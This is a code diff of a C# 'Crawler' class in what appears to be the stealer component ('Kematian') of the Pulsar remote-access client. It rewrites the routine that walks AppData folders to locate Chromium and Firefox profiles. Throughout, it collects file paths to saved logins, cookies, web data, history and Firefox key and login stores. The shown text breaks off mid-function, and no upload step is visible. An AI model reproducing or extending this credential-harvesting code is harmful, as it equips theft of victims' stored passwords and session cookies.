@@ -12,927 +12,381 @@ namespace Pulsar.Client.Kematian.Browsers.Helpers
     public class Crawler
     {
         private const int MAX_DEPTH = 3;
-        private static readonly string[] profileNames = { "Default", "Profile" };
-        private static readonly string[] commonProgramDirs = { 
-            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
-            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
-            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
-        };
-        private static readonly string[] commonAppDataDirs = {
-            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
-        };
-        private static readonly string[] additionalRootDirs = {
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData"),
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents"),
-            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
-        };
-        private static readonly string[] chromiumProfileFiles = {
-            "Cookies", "History", "Web Data", "Login Data", "Bookmarks", "Preferences"
-        };
-        private static readonly string[] chromiumRequiredFiles = {
-            "Cookies", "History", "Login Data" 
-        };
-        private static readonly string[] geckoProfileFiles = {
-            "cookies.sqlite", "places.sqlite", "key4.db", "logins.json", "formhistory.sqlite",
-            "content-prefs.sqlite", "extensions.json", "permissions.sqlite", "prefs.js",
-            "addons.json", "cert9.db", "xulstore.json"
-        };
-        private static readonly string[] geckoRequiredFiles = {
-            "cookies.sqlite", "places.sqlite"
-        };
-        private readonly HashSet<string> _scannedDirs = new HashSet<string>();
-        private static readonly string[] altUserDataFolders = {
-            "User Data", "UserData", "user-data", "BrowserData", "Browser Data", "Data"
-        };
-        private static readonly string[] webViewTerms = {
-            "webview", "ebwebview", "edgewebview", "chromewebview", "chakrawebview", "embedded", 
-            "component", "electron", ".net", "runtime", "msedge_", "microsoft-edge", "spotify",
-            "discord", "teams", "slack", "twitch", "vscode", "whatsapp", "telegram"
-        };
-        private static readonly string[] appNames = {
-            "spotify", "discord", "slack", "teams", "vscode", "atom", "visual studio",
-            "office", "photoshop", "adobe", "twitch", "steam", "epic games", "whatsapp",
-            "telegram", "skype", "zoom"
+        private readonly string[] knownBrowserPaths = {
+            @"Opera",
+            @"Opera Software\Opera GX Stable",
         };
 
-        public List<ChromiumBrowserPath> GetChromiumBrowsers()
+        private readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        private readonly string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+        public AllBrowsers FindAllBrowsers()
         {
-            var browsers = new ConcurrentBag<ChromiumBrowserPath>();
-            _scannedDirs.Clear();
-            
-            var searchTasks = new List<Task>();
-            
-            foreach (var appDataDir in commonAppDataDirs)
-            {
-                searchTasks.Add(SearchFolderForChromium(appDataDir, browsers, 0));
-            }
-            
-            foreach (var programDir in commonProgramDirs)
-            {
-                if (Directory.Exists(programDir))
-                    searchTasks.Add(SearchFolderForChromium(programDir, browsers, 0));
-            }
-            
-            foreach (var rootDir in additionalRootDirs)
+            var chromiumBrowsers = new ConcurrentBag<BrowserChromium>();
+            var geckoBrowsers = new ConcurrentBag<BrowserGecko>();
+            string[] rootDirs = { localAppData, appData };
+
+            Parallel.ForEach(rootDirs, rootDir =>
             {
                 if (Directory.Exists(rootDir))
-                    searchTasks.Add(SearchFolderForChromium(rootDir, browsers, 0));
+                {
+                    Debug.WriteLine($"[INFO] Starting deep search in: {rootDir}");
+                    if (rootDir == appData)
+                    {
+                        SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, true);
+                    }
+                    else
+                    {
+                        SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, false);
+                    }
+                }
+            });
+
+            // Check known browser paths
+            foreach (var knownPath in knownBrowserPaths)
+            {
+                string fullPath = Path.Combine(appData, knownPath);
+                if (Directory.Exists(fullPath))
+                {
+                    Debug.WriteLine($"[INFO] Checking known browser path: {fullPath}");
+                    if (knownPath.Contains("Opera"))
+                    {
+                        CheckForOperaBrowser(fullPath, chromiumBrowsers);
+                    }
+                    else
+                    {
+                        CheckForBrowser(fullPath, chromiumBrowsers, geckoBrowsers, true);
+                    }
+                }
             }
-            
-            Task.WhenAll(searchTasks).GetAwaiter().GetResult();
-            return browsers.ToList();
+
+            // Log found browsers
+            LogFoundBrowsers(chromiumBrowsers, geckoBrowsers);
+
+            return new AllBrowsers
+            {
+                Chromium = chromiumBrowsers.ToArray(),
+                Gecko = geckoBrowsers.ToArray()
+            };
         }
 
-        private async Task SearchFolderForChromium(string rootDir, ConcurrentBag<ChromiumBrowserPath> browsers, int depth)
+        private void SearchDirectory(string directory, ConcurrentBag<BrowserChromium> chromiumBrowsers,
+                                          ConcurrentBag<BrowserGecko> geckoBrowsers, bool isRoaming, int depth = 0)
         {
             if (depth > MAX_DEPTH) return;
-            if (ContainsWebViewTerm(rootDir)) return;
 
             try
             {
-                await CheckForChromiumBrowser(rootDir, browsers);
-                
-                string[] subDirs;
-                try {
-                    subDirs = Directory.GetDirectories(rootDir);
-                } catch {
+                CheckForBrowser(directory, chromiumBrowsers, geckoBrowsers, isRoaming);
+
+                // Skip some common non-browser directories to improve performance
+                string dirName = Path.GetFileName(directory).ToLowerInvariant();
+                if (dirName == "temp" || dirName == "cache" || dirName == "logs" ||
+                    dirName == "thumbnails" || dirName == "crash reports")
                     return;
-                }
-                
-                var dirTasks = new List<Task>();
-                foreach (var dir in subDirs)
+
+                var subDirs = Directory.GetDirectories(directory);
+                Parallel.ForEach(subDirs, dir =>
                 {
-                    if (!Directory.Exists(dir)) continue;
-                    if (ContainsWebViewTerm(dir)) continue;
-                    
-                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
-                    
-                    if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
-                        dirName == "windows" || dirName == "program files" || dirName == "program files (x86)" ||
-                        dirName == "logs" || dirName == "winsparkle" || dirName == "local" || 
-                        dirName == "updates" || dirName == "crash reports" || dirName == "ebwebview" ||
-                        dirName.Contains("webview") || dirName.Contains("runtime") || dirName.Contains("electron"))
-                    {
-                        if (depth > 0) continue;
-                    }
-                    
-                    dirTasks.Add(SearchFolderForChromium(dir, browsers, depth + 1));
-                }
-                
-                if (dirTasks.Count > 0)
-                    await Task.WhenAll(dirTasks);
+                    SearchDirectory(dir, chromiumBrowsers, geckoBrowsers, isRoaming, depth + 1);
+                });
             }
-            catch { }
+            catch (UnauthorizedAccessException)
+            {
+                // Skip directories we don't have access to
+            }
+            catch (PathTooLongException)
+            {
+                // Skip paths that are too long
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[ERROR] In directory {directory}: {ex.Message}");
+            }
         }
-        
-        private async Task CheckForChromiumBrowser(string directory, ConcurrentBag<ChromiumBrowserPath> browsers)
+
+        private void CheckForBrowser(string path, ConcurrentBag<BrowserChromium> chromiumBrowsers,
+                                          ConcurrentBag<BrowserGecko> geckoBrowsers, bool isRoaming)
         {
             try
             {
-                if (ContainsWebViewTerm(directory)) return;
-                
-                lock (_scannedDirs)
-                {
-                    if (_scannedDirs.Contains(directory)) return;
-                    _scannedDirs.Add(directory);
-                }
-                
-                string dirName = Path.GetFileName(directory).ToLowerInvariant();
-                if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
-                    dirName == "crash" || dirName.Contains("update") || dirName == "winsparkle" || 
-                    dirName == "logs" || dirName == "cache" || dirName.EndsWith(".old") ||
-                    dirName.Contains("sandbox") || dirName.Contains("test") || dirName == "ebwebview" ||
-                    dirName.Contains("webview") || dirName.Contains("electron") || dirName.Contains("runtime"))
-                {
-                    return;
-                }
-                
-                foreach (var appName in appNames)
-                {
-                    if (dirName.Contains(appName) || directory.ToLowerInvariant().Contains("\\" + appName + "\\"))
-                        return;
-                }
-                
-                bool isUserData = false;
-                string userDataPath = "";
-                
-                foreach (var folderName in altUserDataFolders)
-                {
-                    if (Path.GetFileName(directory).Equals(folderName, StringComparison.OrdinalIgnoreCase))
-                    {
-                        isUserData = true;
-                        userDataPath = directory;
-                        break;
-                    }
-                    
-                    string tempPath = Path.Combine(directory, folderName);
-                    if (Directory.Exists(tempPath))
-                    {
-                        userDataPath = tempPath;
-                        break;
-                    }
-                }
-                
-                if (!string.IsNullOrEmpty(userDataPath))
+                // Check for Chromium browsers
+                string userDataPath = Path.Combine(path, "User Data");
+                if (Directory.Exists(userDataPath))
                 {
                     string localStatePath = Path.Combine(userDataPath, "Local State");
                     if (File.Exists(localStatePath))
                     {
-                        var profiles = await FindChromiumProfiles(userDataPath);
-                        if (profiles.Length > 0)
+                        Debug.WriteLine($"[DETECT] Found Chromium browser at: {userDataPath}");
+                        var profiles = FindChromiumProfiles(userDataPath);
+
+                        if (profiles.Count > 0)
                         {
-                            browsers.Add(new ChromiumBrowserPath
+                            chromiumBrowsers.Add(new BrowserChromium
                             {
-                                LocalStatePath = localStatePath,
-                                ProfilePath = userDataPath,
-                                Profiles = profiles
+                                Name = Path.GetFileName(path),
+                                LocalState = localStatePath,
+                                Path = path,
+                                Profiles = profiles.ToArray()
                             });
-                            return;
-                        }
-                    }
-                    else
-                    {
-                        var profiles = await FindChromiumProfiles(userDataPath);
-                        if (profiles.Length > 0)
-                        {
-                            browsers.Add(new ChromiumBrowserPath
-                            {
-                                LocalStatePath = "",
-                                ProfilePath = userDataPath,
-                                Profiles = profiles
-                            });
-                            return;
+                            Debug.WriteLine($"[SUCCESS] Added Chromium browser with {profiles.Count} profiles");
                         }
                     }
                 }
 
-                if (await IsChromiumProfileDirectory(directory))
+                // Check for Firefox/Gecko browsers
+                if (isRoaming)
                 {
-                    string parentDir = Directory.GetParent(directory)?.FullName;
-                    if (parentDir != null)
-                    {
-                        string localStatePath = Path.Combine(parentDir, "Local State");
-                        var profiles = new ConcurrentDictionary<string, ChromiumProfile>();
-                        if (await TryAddChromiumProfileWithKey(directory, profiles))
-                        {
-                            browsers.Add(new ChromiumBrowserPath
-                            {
-                                LocalStatePath = File.Exists(localStatePath) ? localStatePath : "",
-                                ProfilePath = parentDir,
-                                Profiles = profiles.Values.ToArray()
-                            });
-                            return;
-                        }
-                    }
-                }
-                
-                if (Directory.Exists(directory))
-                {
-                    try
-                    {
-                        var profileDirs = new List<string>();
-                        
-                        foreach (var subdir in Directory.GetDirectories(directory, "profile*", SearchOption.TopDirectoryOnly))
-                        {
-                            if (await IsChromiumProfileDirectory(subdir))
-                            {
-                                profileDirs.Add(subdir);
-                            }
-                        }
-                        
-                        foreach (var subdir in Directory.GetDirectories(directory, "default", SearchOption.TopDirectoryOnly))
-                        {
-                            if (await IsChromiumProfileDirectory(subdir))
-                            {
-                                profileDirs.Add(subdir);
-                            }
-                        }
-                        
-                        if (profileDirs.Count > 0)
-                        {
-                            var profiles = new ConcurrentDictionary<string, ChromiumProfile>();
-                            var profileTasks = new List<Task>();
-                            
-                            foreach (var profileDir in profileDirs)
-                            {
-                                profileTasks.Add(TryAddChromiumProfileWithKey(profileDir, profiles));
-                            }
-                            
-                            await Task.WhenAll(profileTasks);
-                            
-                            if (profiles.Count > 0)
-                            {
-                                browsers.Add(new ChromiumBrowserPath
-                                {
-                                    LocalStatePath = "",
-                                    ProfilePath = directory,
-                                    Profiles = profiles.Values.ToArray()
-                                });
-                                return;
-                            }
-                        }
-                    }
-                    catch { }
+                    CheckForGeckoBrowser(path, geckoBrowsers);
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[ERROR] Checking browser in {path}: {ex.Message}");
+            }
         }
 
-        private async Task<bool> IsChromiumProfileDirectory(string directory)
+        private List<ProfileChromium> FindChromiumProfiles(string userDataPath)
         {
-            if (!Directory.Exists(directory)) return false;
-            
-            string dirName = Path.GetFileName(directory).ToLowerInvariant();
-            foreach (var appName in appNames)
-            {
-                if (dirName.Contains(appName) || directory.ToLowerInvariant().Contains("\\" + appName + "\\"))
-                    return false;
-            }
-            
-            int fileCount = 0;
-            int requiredFileCount = 0;
-            
-            foreach (var file in chromiumProfileFiles)
-            {
-                string filePath = Path.Combine(directory, file);
-                bool exists = await Task.Run(() => File.Exists(filePath));
-                
-                if (exists)
-                {
-                    fileCount++;
-                    if (chromiumRequiredFiles.Contains(file))
-                        requiredFileCount++;
-                }
-            }
-            
-            float confidence = (float)fileCount / chromiumProfileFiles.Length * 100;
-            Debug.WriteLine($"Chromium profile confidence for {directory}: {confidence:F1}%, required files: {requiredFileCount}/{chromiumRequiredFiles.Length}");
-            
-            return confidence >= 50 && requiredFileCount >= 1;
-        }
-        
-        private async Task<ChromiumProfile[]> FindChromiumProfiles(string userDataDir)
-        {
-            var profiles = new ConcurrentDictionary<string, ChromiumProfile>();
-            
-            try
-            {
-                string[] subDirs;
-                try {
-                    subDirs = Directory.GetDirectories(userDataDir);
-                } catch {
-                    return new ChromiumProfile[0];
-                }
-
-                var profileTasks = new List<Task>();
-                foreach (var dir in subDirs)
-                {
-                    string dirName = Path.GetFileName(dir);
-                    
-                    if (dirName.StartsWith("Default", StringComparison.OrdinalIgnoreCase) || 
-                        dirName.StartsWith("Profile", StringComparison.OrdinalIgnoreCase) ||
-                        dirName.Contains("Profile") ||
-                        await IsChromiumProfileDirectory(dir))
-                    {
-                        profileTasks.Add(TryAddChromiumProfileWithKey(dir, profiles));
-                    }
-                }
-
-                if (profileTasks.Count > 0)
-                    await Task.WhenAll(profileTasks);
-            }
-            catch { }
-
-            return profiles.Values.ToArray();
-        }
-
-        private async Task<bool> TryAddChromiumProfileWithKey(string profileDir, ConcurrentDictionary<string, ChromiumProfile> profiles)
-        {
-            try
-            {
-                if (profileDir.Contains(".ini") || profileDir.Contains(".log") || 
-                    profileDir.Contains(".json") || profileDir.Contains(".temp") ||
-                    profileDir.Contains("updater") || profileDir.Contains("installer") ||
-                    ContainsWebViewTerm(profileDir)) 
-                {
-                    return false;
-                }
-                
-                string profileName = Path.GetFileName(profileDir);
-                
-                foreach (var appName in appNames)
-                {
-                    if (profileName.Contains(appName) || profileDir.ToLowerInvariant().Contains("\\" + appName + "\\"))
-                        return false;
-                }
-                
-                Debug.WriteLine($"Checking potential Chromium profile: {profileDir}");
-                
-                string webDataPath = Path.Combine(profileDir, "Web Data");
-                string cookiesPath = Path.Combine(profileDir, "Cookies");
-                string historyPath = Path.Combine(profileDir, "History");
-                string loginDataPath = Path.Combine(profileDir, "Login Data");
-                string bookmarksPath = Path.Combine(profileDir, "Bookmarks");
-                string preferencesPath = Path.Combine(profileDir, "Preferences");
-                
-                bool[] fileExists = await Task.WhenAll(
-                    Task.Run(() => File.Exists(webDataPath)),
-                    Task.Run(() => File.Exists(cookiesPath)),
-                    Task.Run(() => File.Exists(historyPath)),
-                    Task.Run(() => File.Exists(loginDataPath)),
-                    Task.Run(() => File.Exists(bookmarksPath)),
-                    Task.Run(() => File.Exists(preferencesPath))
-                );
-                
-                bool hasWebData = fileExists[0];
-                bool hasCookies = fileExists[1];
-                bool hasHistory = fileExists[2];
-                bool hasLoginData = fileExists[3];
-                bool hasBookmarks = fileExists[4];
-                bool hasPreferences = fileExists[5];
-                
-                if (!hasCookies)
-                {
-                    string networkDir = Path.Combine(profileDir, "Network");
-                    if (Directory.Exists(networkDir))
-                    {
-                        string networkCookiesPath = Path.Combine(networkDir, "Cookies");
-                        if (await Task.Run(() => File.Exists(networkCookiesPath)))
-                        {
-                            hasCookies = true;
-                            cookiesPath = networkCookiesPath;
-                        }
-                    }
-                }
-                
-                if (!hasCookies)
-                {
-                    try
-                    {
-                        var cookiesFiles = await Task.Run(() => Directory.GetFiles(profileDir, "Cookies", SearchOption.AllDirectories)
-                            .Where(f => !f.Contains("\\Journal\\") && !f.Contains("\\temp\\") && !f.Contains(".old") && !f.Contains("-journal"))
-                            .ToList());
-                            
-                        if (cookiesFiles.Count > 0)
-                        {
-                            hasCookies = true;
-                            cookiesPath = cookiesFiles[0];
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error searching for cookies: {ex.Message}");
-                    }
-                }
-                
-                if (!hasHistory)
-                {
-                    try
-                    {
-                        var historyFiles = await Task.Run(() => Directory.GetFiles(profileDir, "History", SearchOption.AllDirectories)
-                            .Where(f => !f.Contains("\\Journal\\") && !f.Contains("\\temp\\") && !f.Contains(".old") && !f.Contains("-journal"))
-                            .ToList());
-                            
-                        if (historyFiles.Count > 0)
-                        {
-                            hasHistory = true;
-                            historyPath = historyFiles[0];
-                        }
-                    }
-                    catch { }
-                }
-                
-                int presentFileCount = 0;
-                if (hasWebData) presentFileCount++;
-                if (hasCookies) presentFileCount++;
-                if (hasHistory) presentFileCount++;
-                if (hasLoginData) presentFileCount++;
-                if (hasBookmarks) presentFileCount++;
-                if (hasPreferences) presentFileCount++;
-                
-                float confidence = (float)presentFileCount / chromiumProfileFiles.Length * 100;
-                
-                int requiredFileCount = 0;
-                if (hasCookies) requiredFileCount++;
-                if (hasHistory) requiredFileCount++;
-                if (hasLoginData) requiredFileCount++;
-                
-                Debug.WriteLine($"Chromium profile validation for {profileDir}: {confidence:F1}%, required files: {requiredFileCount}/{chromiumRequiredFiles.Length}");
-                
-                bool isValidProfile = confidence >= 50 && requiredFileCount >= 1;
-                
-                if (isValidProfile)
-                {
-                    var profile = new ChromiumProfile
-                    {
-                        WebData = hasWebData ? webDataPath : string.Empty,
-                        Cookies = hasCookies ? cookiesPath : string.Empty,
-                        History = hasHistory ? historyPath : string.Empty,
-                        LoginData = hasLoginData ? loginDataPath : string.Empty,
-                        Bookmarks = hasBookmarks ? bookmarksPath : string.Empty,
-                        Name = profileName
-                    };
-                    
-                    profiles[profileDir] = profile;
-                    return true;
-                }
-            }
-            catch (Exception ex) 
-            {
-                Debug.WriteLine($"Error in adding chromium profile: {ex.Message}");
-            }
-            
-            return false;
-        }
-
-        public List<GeckoBrowserPath> GetGeckoBrowsers()
-        {
-            var browsers = new ConcurrentBag<GeckoBrowserPath>();
-            _scannedDirs.Clear();
-            
-            var searchTasks = new List<Task>();
-            
-            foreach (var appDataDir in commonAppDataDirs)
-            {
-                searchTasks.Add(SearchFolderForGecko(appDataDir, browsers, 0));
-            }
-            
-            foreach (var programDir in commonProgramDirs)
-            {
-                if (Directory.Exists(programDir))
-                    searchTasks.Add(SearchFolderForGecko(programDir, browsers, 0));
-            }
-            
-            foreach (var rootDir in additionalRootDirs)
-            {
-                if (Directory.Exists(rootDir))
-                    searchTasks.Add(SearchFolderForGecko(rootDir, browsers, 0));
-            }
-            
-            Task.WhenAll(searchTasks).GetAwaiter().GetResult();
-
-            var profilesIniTasks = new List<Task>();
-            foreach (var appDataDir in commonAppDataDirs)
-            {
-                profilesIniTasks.Add(SearchForProfilesIni(appDataDir, browsers, 0));
-            }
-            foreach (var rootDir in additionalRootDirs)
-            {
-                if (Directory.Exists(rootDir))
-                    profilesIniTasks.Add(SearchForProfilesIni(rootDir, browsers, 0));
-            }
-            Task.WhenAll(profilesIniTasks).GetAwaiter().GetResult();
-
-            return browsers.ToList();
-        }
-
-        private async Task SearchForProfilesIni(string rootDir, ConcurrentBag<GeckoBrowserPath> browsers, int depth)
-        {
-            if (depth > MAX_DEPTH) return;
-            if (ContainsWebViewTerm(rootDir)) return;
+            var profiles = new List<ProfileChromium>();
 
             try
             {
-                string[] files;
-                try {
-                    files = Directory.GetFiles(rootDir, "profiles.ini");
-                } catch {
-                    return;
-                }
-                
-                var fileTasks = new List<Task>();
-                foreach (var file in files)
+                // Check root directory for Opera-style direct file storage
+                TryAddChromiumProfile(profiles, userDataPath, "Root");
+
+                // Check Default profile
+                string defaultProfile = Path.Combine(userDataPath, "Default");
+                if (Directory.Exists(defaultProfile))
                 {
-                    string directory = Path.GetDirectoryName(file);
-                    if (directory != null && !ContainsWebViewTerm(directory))
-                    {
-                        fileTasks.Add(CheckGeckoProfilesIni(file, directory, browsers));
-                    }
+                    TryAddChromiumProfile(profiles, defaultProfile, "Default");
                 }
-                
-                if (fileTasks.Count > 0)
-                    await Task.WhenAll(fileTasks);
-                
-                string[] subDirs;
-                try {
-                    subDirs = Directory.GetDirectories(rootDir);
-                } catch {
-                    return;
-                }
-                
-                var dirTasks = new List<Task>();
-                foreach (var dir in subDirs)
+
+                // Check Profile X directories
+                var profileDirs = Directory.GetDirectories(userDataPath)
+                    .Where(dir => Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
+                    .ToList();
+
+                foreach (var profileDir in profileDirs)
                 {
-                    if (!Directory.Exists(dir)) continue;
-                    if (ContainsWebViewTerm(dir)) continue;
-                    
-                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
-                    
-                    if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
-                        dirName == "windows" || dirName == "program files" || dirName == "program files (x86)" ||
-                        dirName == "ebwebview" || dirName.Contains("webview"))
-                    {
-                        if (depth > 0) continue;
-                    }
-                    
-                    dirTasks.Add(SearchForProfilesIni(dir, browsers, depth + 1));
+                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                 }
-                
-                if (dirTasks.Count > 0)
-                    await Task.WhenAll(dirTasks);
+
+                // Check for other non-standard profile directories
+                var otherProfiles = Directory.GetDirectories(userDataPath)
+                    .Where(dir => !Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase) &&
+                                 Path.GetFileName(dir) != "Default" &&
+                                 !IsSystemDirectory(Path.GetFileName(dir)))
+                    .ToList();
+
+                foreach (var profileDir in otherProfiles)
+                {
+                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
+                }
             }
-            catch { }
-        }
-
-        private async Task SearchFolderForGecko(string rootDir, ConcurrentBag<GeckoBrowserPath> browsers, int depth)
-        {
-            if (depth > MAX_DEPTH) return;
-            if (ContainsWebViewTerm(rootDir)) return;
-
-            try
+            catch (Exception ex)
             {
-                await CheckForGeckoBrowser(rootDir, browsers);
-                
-                string[] subDirs;
-                try {
-                    subDirs = Directory.GetDirectories(rootDir);
-                } catch {
-                    return;
-                }
-                
-                var dirTasks = new List<Task>();
-                foreach (var dir in subDirs)
-                {
-                    if (!Directory.Exists(dir)) continue;
-                    if (ContainsWebViewTerm(dir)) continue;
-                    
-                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
-                    
-                    if (dirName == "temp" || dirName == "tmp" || dirName.Contains("temporary") || 
-                        dirName == "windows" || dirName == "program files" || dirName == "program files (x86)" ||
-                        dirName == "logs" || dirName == "winsparkle" || dirName == "local" || 
-                        dirName == "updates" || dirName == "crash reports" || dirName == "ebwebview" ||
-                        dirName.Contains("webview") || dirName.Contains("runtime") || dirName.Contains("electron"))
-                    {
-                        if (depth > 0) continue;
-                    }
-                    
-                    dirTasks.Add(SearchFolderForGecko(dir, browsers, depth + 1));
-                }
-                
-                if (dirTasks.Count > 0)
-                    await Task.WhenAll(dirTasks);
+                Debug.WriteLine($"[ERROR] Finding Chromium profiles: {ex.Message}");
             }
-            catch { }
+
+            return profiles;
         }
-        
-        private async Task CheckGeckoProfilesIni(string iniPath, string directory, ConcurrentBag<GeckoBrowserPath> browsers)
+
+        private void TryAddChromiumProfile(List<ProfileChromium> profiles, string profileDir, string profileName)
         {
             try
             {
-                lock (_scannedDirs)
-                {
-                    if (_scannedDirs.Contains(directory)) return;
-                    _scannedDirs.Add(directory);
-                }
-                
-                var profiles = await FindGeckoProfilesFromIni(iniPath, directory);
-                if (profiles.Length > 0)
-                {
-                    browsers.Add(new GeckoBrowserPath {
-                        ProfilesPath = directory,
-                        Profiles = profiles
-                    });
-                }
-            }
-            catch { }
-        }
-        
-        private async Task CheckForGeckoBrowser(string directory, ConcurrentBag<GeckoBrowserPath> browsers)
-        {
-            try
-            {
-                if (ContainsWebViewTerm(directory)) return;
-                
-                lock (_scannedDirs)
-                {
-                    if (_scannedDirs.Contains(directory)) return;
-                    _scannedDirs.Add(directory);
-                }
-                
-                string profilesIni = Path.Combine(directory, "profiles.ini");
-                
-                if (File.Exists(profilesIni))
-                {
-                    var profiles = await FindGeckoProfilesFromIni(profilesIni, directory);
-                    if (profiles.Length > 0)
-                    {
-                        browsers.Add(new GeckoBrowserPath {
-                            ProfilesPath = directory,
-                            Profiles = profiles
-                        });
-                        return;
-                    }
-                }
-                
-                if (await IsGeckoProfileDirectory(directory))
-                {
-                    var profile = await CreateGeckoProfile(directory);
-                    if (!string.IsNullOrEmpty(profile.Path))
-                    {
-                        browsers.Add(new GeckoBrowserPath {
-                            ProfilesPath = directory,
-                            Profiles = new[] { profile }
-                        });
-                        return;
-                    }
-                }
-                
-                string profilesDir = Path.Combine(directory, "Profiles");
-                if (Directory.Exists(profilesDir))
-                {
-                    var profilesList = new List<GeckoProfile>();
-                    var profileTasks = new List<Task<GeckoProfile>>();
-                    
-                    foreach (var subDir in Directory.GetDirectories(profilesDir))
-                    {
-                        if (await IsGeckoProfileDirectory(subDir))
-                        {
-                            profileTasks.Add(CreateGeckoProfile(subDir));
-                        }
-                    }
-                    
-                    if (profileTasks.Count > 0)
-                    {
-                        var completedProfiles = await Task.WhenAll(profileTasks);
-                        foreach (var profile in completedProfiles)
-                        {
-                            if (!string.IsNullOrEmpty(profile.Path))
-                            {
-                                profilesList.Add(profile);
-                            }
-                        }
-                        
-                        if (profilesList.Count > 0)
-                        {
-                            browsers.Add(new GeckoBrowserPath {
-                                ProfilesPath = directory,
-                                Profiles = profilesList.ToArray()
-                            });
-                            return;
-                        }
-                    }
-                }
+                // Create network subdirectory path - sometimes cookies are stored here
+                string networkDir = Path.Combine(profileDir, "Network");
+                string cookiesNetworkPath = Path.Combine(networkDir, "Cookies");
+                string cookiesDirectPath = Path.Combine(profileDir, "Cookies");
 
-                var directoryProfiles = new List<GeckoProfile>();
-                var dirProfileTasks = new List<Task<GeckoProfile>>();
-                
-                foreach (var subDir in Directory.GetDirectories(directory))
+                var profile = new ProfileChromium
                 {
-                    if (await IsGeckoProfileDirectory(subDir))
-                    {
-                        dirProfileTasks.Add(CreateGeckoProfile(subDir));
-                    }
-                }
-                
-                if (dirProfileTasks.Count > 0)
-                {
-                    var completedProfiles = await Task.WhenAll(dirProfileTasks);
-                    foreach (var profile in completedProfiles)
-                    {
-                        if (!string.IsNullOrEmpty(profile.Path))
-                        {
-                            directoryProfiles.Add(profile);
-                        }
-                    }
-                    
-                    if (directoryProfiles.Count > 0)
-                    {
-                        browsers.Add(new GeckoBrowserPath {
-                            ProfilesPath = directory,
-                            Profiles = directoryProfiles.ToArray()
-                        });
-                    }
-                }
-            }
-            catch { }
-        }
-        
-        private async Task<GeckoProfile[]> FindGeckoProfilesFromIni(string iniPath, string profilesDir)
-        {
-            var profiles = new List<GeckoProfile>();
+                    Name = profileName,
+                    Path = profileDir,
+                    LoginData = Path.Combine(profileDir, "Login Data"),
+                    WebData = Path.Combine(profileDir, "Web Data"),
+                    Cookies = File.Exists(cookiesNetworkPath) ? cookiesNetworkPath : cookiesDirectPath,
+                    History = Path.Combine(profileDir, "History"),
+                    Bookmarks = Path.Combine(profileDir, "Bookmarks")
+                };
 
-            try
-            {
-                var iniContent = await Task.Run(() => File.ReadAllText(iniPath));
-                var profilePaths = await ParseProfilePaths(iniContent, profilesDir);
-                
-                var profileTasks = new List<Task<GeckoProfile>>();
-                foreach (var profilePath in profilePaths)
+                // Count how many data files we have - browsers may use different combinations
+                Dictionary<string, bool> fileStatuses = new Dictionary<string, bool>
                 {
-                    if (Directory.Exists(profilePath))
-                    {
-                        profileTasks.Add(CreateGeckoProfile(profilePath));
-                    }
-                }
-                
-                if (profileTasks.Count > 0)
-                {
-                    var completedProfiles = await Task.WhenAll(profileTasks);
-                    foreach (var profile in completedProfiles)
-                    {
-                        if (!string.IsNullOrEmpty(profile.Path))
+                    { "LoginData", File.Exists(profile.LoginData) },
+                    { "WebData", File.Exists(profile.WebData) },
+                    { "Cookies", File.Exists(profile.Cookies) },
+                    { "History", File.Exists(profile.History) },
+                    { "Bookmarks", File.Exists(profile.Bookmarks) }
+                };
+
+                int validFiles = fileStatuses.Count(kvp => kvp.Value);
+
+                // Consider a profile valid if it has at least 2 of the expected files
+                if (validFiles >= 2 && !profileDir.Contains("Application Data"))
                 {
                     profiles.Add(profile);
+                    Debug.WriteLine($"[SUCCESS] Added profile {profileName} with {validFiles}/5 data files");
+                }
+                else if (validFiles > 0)
+                {
+                    Debug.WriteLine($"[INCOMPLETE] Profile {profileName} has only {validFiles}/5 data files");
                 }
             }
-                }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[ERROR] Adding Chromium profile {profileName}: {ex.Message}");
             }
-            catch { }
-
-            return profiles.ToArray();
         }
-        
-        private async Task<bool> IsGeckoProfileDirectory(string directory)
+
+        private void CheckForGeckoBrowser(string path, ConcurrentBag<BrowserGecko> geckoBrowsers)
         {
-            if (!Directory.Exists(directory)) return false;
-            
             try
             {
-                int fileCount = 0;
-                int requiredFileCount = 0;
-                
-                foreach (var file in geckoProfileFiles)
+                // First check direct path for Firefox profile
+                string dirName = Path.GetFileName(path);
+                if (dirName.Contains(".default-") || dirName.EndsWith(".default"))
                 {
-                    string filePath = Path.Combine(directory, file);
-                    bool exists = await Task.Run(() => File.Exists(filePath));
-                    
-                    if (exists)
+                    TryAddGeckoProfile(path, geckoBrowsers);
+                }
+
+                // Check for Firefox "Profiles" directory structure
+                string profilesPath = Path.Combine(path, "Profiles");
+                if (Directory.Exists(profilesPath))
+                {
+                    var defaultProfiles = Directory.GetDirectories(profilesPath)
+                        .Where(dir => Path.GetFileName(dir).Contains(".default-") ||
+                                      Path.GetFileName(dir).EndsWith(".default"))
+                        .ToList();
+
